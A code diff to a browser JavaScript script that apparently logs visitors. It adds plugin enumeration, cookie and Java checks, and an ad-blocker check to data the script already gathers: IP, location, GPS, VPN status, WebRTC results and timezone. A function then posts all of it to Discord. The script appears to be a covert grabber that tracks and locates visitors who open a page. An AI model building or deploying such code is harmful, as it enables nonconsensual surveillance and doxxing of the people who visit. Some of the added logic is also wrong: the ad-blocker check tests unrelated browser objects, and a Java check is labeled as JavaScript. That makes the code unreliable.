@@ -42,11 +42,16 @@ function getSystemDetails() {
     var operatingSystem = detectOperatingSystem(userAgent);
     var browser = detectBrowser(userAgent);
 
+    // Get installed plugins/add-ons
+    var plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
+    
     return {
         operatingSystem,
-        browser
+        browser,
+        plugins: plugins.join(', ')
     };
 }
+
 
 // Function to get IP and location data
 function getLocationAndGPSData() {
@@ -218,12 +223,26 @@ function getAdditionalDetails() {
     browserVersion = browserVersion ? browserVersion[2] : 'Unknown';
     var connectionType = navigator.connection ? navigator.connection.type : 'Unknown';
     var doNotTrack = navigator.doNotTrack || 'Unknown';
+    var cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+    var javascriptEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'Unknown';
+    var adBlockerEnabled = false;
+
+    if (window.chrome && window.chrome.webstore) {
+        adBlockerEnabled = true;
+    } else if (window.InstallTrigger && 'ss' in window.InstallTrigger) {
+        adBlockerEnabled = true;
+    }
+    console.log(adBlockerEnabled)
+
 
     return {
         deviceType,
         browserVersion,
         connectionType,
-        doNotTrack
+        doNotTrack,
+        cookiesEnabled,
+        javascriptEnabled,
+        adBlockerEnabled
     };
 }
 
@@ -231,6 +250,7 @@ function getAdditionalDetails() {
 // Function to send message to Discord
 function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone) {
     var additionalDetails = getAdditionalDetails();
+    var otherDetails = getSystemDetails();
 
     // Combine additionalDetails and other data into a single object
     var postData = {
@@ -244,7 +264,7 @@ function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, r
         isVpn: isVpn,
         vpnMessage: vpnMessage,
         webrtcResult: webrtcResult,
-        userTimezone: userTimezone
+        userTimezone: userTimezone,
     };
 
     // Send POST request to the / URL
